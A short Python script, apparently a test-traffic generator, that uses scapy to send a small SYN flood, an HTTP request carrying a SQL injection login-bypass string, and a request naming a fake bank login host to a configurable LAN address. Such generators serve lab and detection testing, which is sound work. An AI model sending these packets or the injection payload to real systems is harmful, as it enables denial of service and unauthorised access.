from scapy.all import Ether, IP, TCP, sendp

def simulate_syn_flood(dst_ip="192.168.1.100", port=80, count=10):
    print(f"⚠️ Simulating SYN Flood on {dst_ip}:{port} ({count} packets)...")
    for i in range(count):
        pkt = Ether()/IP(dst=dst_ip)/TCP(dport=port, flags="S")
        sendp(pkt, verbose=0)

def simulate_sql_injection_http(dst_ip="192.168.1.100", port=80):
    print(f"⚠️ Simulating SQL Injection HTTP packet to {dst_ip}:{port}...")
    http_payload = (
        "GET /login.php?user=admin' OR '1'='1&pass=123 HTTP/1.1\r\n"
        "Host: target.local\r\n\r\n"
    )
    pkt = Ether()/IP(dst=dst_ip)/TCP(dport=port, flags="PA")/http_payload
    sendp(pkt, verbose=0)

def simulate_phishing_url(dst_ip="192.168.1.100", port=80):
    print(f"⚠️ Simulating phishing link packet to {dst_ip}:{port}...")
    fake_url = (
        "GET /bank-login HTTP/1.1\r\n"
        "Host: fakebank-login.com\r\n"
        "User-Agent: Mozilla\r\n\r\n"
    )
    pkt = Ether()/IP(dst=dst_ip)/TCP(dport=port, flags="PA")/fake_url
    sendp(pkt, verbose=0)
